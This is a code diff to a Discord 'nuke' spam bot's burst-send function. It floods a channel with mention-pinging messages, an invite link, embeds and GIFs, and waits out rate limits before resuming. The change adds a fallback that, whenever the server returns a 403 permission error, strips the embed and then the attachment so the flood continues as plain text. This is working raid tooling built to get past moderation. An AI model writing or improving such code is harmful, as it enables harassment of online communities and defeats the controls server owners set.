@@ -552,15 +552,20 @@ async def _burst_send(channel, n: int, base: str | None) -> int:
     espera_total = 0.0
     _last_burst_error = ""
     emb = _spam_embed(getattr(channel, "guild", None))
+    modo = 0  # 0=completo (embed+gif) | 1=so gif | 2=texto puro
     for _ in range(n):
         try:
             if base:
                 msg = f"{base}\n\n{SOCIETY_LINE}\ndiscord.gg/TGaUktD9D\n{GIF_CUSTOM_URLS[0]}"
             else:
                 msg = build_nuke_payload()
-            await channel.send(msg[:2000], embed=emb,
-                               allowed_mentions=MENTIONS_SEM_PING if sem_ping else MENTIONS,
-                               file=_gif_file())
+            kwargs = {"content": msg[:2000],
+                      "allowed_mentions": MENTIONS_SEM_PING if sem_ping else MENTIONS}
+            if modo == 0 and emb is not None:
+                kwargs["embed"] = emb
+            if modo <= 1:
+                kwargs["file"] = _gif_file()
+            await channel.send(**kwargs)
             ok += 1
         except discord.HTTPException as e:
             if e.status == 429:
@@ -578,6 +583,11 @@ async def _burst_send(channel, n: int, base: str | None) -> int:
                     break
                 await asyncio.sleep(min(ra, 30))
                 espera_total += min(ra, 30)
+                continue
+            elif e.status == 403 and modo < 2:
+                modo += 1
+                _last_burst_error = f"HTTP 403 cod {getattr(e, 'code', '?')} — caindo pra modo {modo} ({'so gif' if modo == 1 else 'texto puro'})"
+                print(f"[burst] {_last_burst_error}", flush=True)
                 continue
             else:
                 _last_burst_error = f"HTTP {e.status}: {str(e)[:180]}"
